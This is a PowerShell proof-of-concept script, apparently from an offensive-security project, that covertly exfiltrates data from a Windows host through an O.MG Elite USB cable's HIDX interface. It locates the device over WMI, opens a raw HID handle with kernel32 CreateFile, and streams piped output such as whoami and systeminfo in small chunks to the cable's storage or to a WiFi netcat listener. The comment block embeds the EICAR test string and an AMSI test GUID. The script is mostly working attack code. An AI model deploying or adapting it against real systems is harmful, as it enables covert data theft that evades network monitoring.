<#
HIDXExfil.ps1
Author: Ø1phor1³ (@01p8or13)
Acknowledgements: spiceywasabi, rogandawes
Required Dependencies: Activated HIDX on OMG Elite device
#>

function HIDXExfil {
<#
.DESCRIPTION
This is a POC.
A “low and slow” method of covert exfiltration meant to provide alternate pentesting pathways beyond using the target host’s network interfaces or mass storage.
This POC will allow data exfiltration back to the O.MG’s flash storage or act as a proxy between the target host and another device, 
via the O.MG Device's built-in WiFi interface, which can allow you to receive data via listeners like nc, netcat, or similar tools.

.PARAMETER Message
Message which gets exfiltrated.

.PARAMETER VendorID
Defining vendor ID of the device. (Default: D3C0)

.PARAMETER ProductID
Defining product ID of the device. (Default: D34D)

.EXAMPLE
Defining a message: 
HIDXExfil -Message "hello world"

.EXAMPLE
HIDX usage with every parameter: 
HIDXExfil -VendorID D3C0 -ProductID D34D -Message "test"

.EXAMPLE
Piping output into HIDX: 
whoami | HIDXExfil

.EXAMPLE
Exfiltrating systeminfo with proper formatting:
systeminfo | Out-String | HIDXExfil

.LINK
https://github.com/0i41E
https://github.com/spiceywasabi
https://github.com/rogandawes

#Credits to Rogan for the idea of filehandle and device identification
#AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386

X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
#>

    [cmdletbinding()]
    param(
        [Parameter(
            Mandatory = $true,
            ValueFromPipeline = $true)]
            $Message,

        [Parameter(Position = 1)]
            [ValidateNotNullOrEmpty()]
            [String]
            $VendorID = "D3C0", #Default value

        [Parameter(Position = 2)]
            [ValidateNotNullOrEmpty()]
            [String]
            $ProductID = "D34D" # Default value
    )

    $omg = $VendorID + "&PID_" + $ProductID
    function Get-OMGDevice(){
        #Identify OMG device
        $devs = gwmi Win32_USBControllerDevice
        $devicestring=$null
        foreach ($dev in $devs) {
            $wmidev = [wmi]$dev.Dependent
            if ($wmidev.GetPropertyValue('DeviceID') -match ($omg) -and ($null -eq $wmidev.GetPropertyValue('Service'))) {
                $devicestring = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
            }
        }

        return $devicestring
    }

    function Send-Message {
        param(
            $fileHandle,
            $payload
        )

        $payloadLength = $payload.Length
        $chunkSize = 8  # Kept at 8 for best experience
        $chunkNr = [Math]::Ceiling($payloadLength / $chunkSize)

 for ($i = 0; $i -lt $chunkNr; $i++) {
        $bytes = New-Object Byte[] (65)
        $start = $i * $chunksize
        $end = [Math]::Min(($i + 1) * $chunksize, $payloadLength)
        $chunkLen = $end - $start
        [System.Buffer]::BlockCopy($payload, $start, $bytes, 1, $chunkLen)
        $filehandle.Write($bytes, 0, 65)
        }
    }
                #Creating filehandle - Method by rogandawes
                Add-Type -TypeDefinition @"
using System;
using System.IO;
using Microsoft.Win32.SafeHandles;
using System.Runtime.InteropServices;
namespace omg {
    public class hidx {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(String fn, UInt32 da, Int32 sm, IntPtr sa, Int32 cd, uint fa, IntPtr tf);

        public static FileStream open(string fn) {
            return new FileStream(CreateFile(fn, 0XC0000000U, 3, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero), FileAccess.ReadWrite, 3, true);
        }
    }
}
"@
    try {
        $deviceString = Get-OMGDevice

        if ($deviceString -eq $null) {
            Write-Host -ForegroundColor Red "[!]Error: Could not find OMG device - Check VID/PID"
            return
        }

        $fileHandle = [omg.hidx]::open($deviceString)

        if ($fileHandle -eq $null) {
            Write-Host -ForegroundColor Red "[!]Error: Filehandle is empty"
            return
        }

        $payload = [System.Text.Encoding]::ASCII.GetBytes($Message + "`n")
        Send-Message -fileHandle $fileHandle -payload $payload

    } catch {
        Write-Host -ForegroundColor Red "[!]Error: $($PSItem.Exception.Message)"
    } finally {
        if ($fileHandle -ne $null) {
            $fileHandle.Close()
        }
    }
}
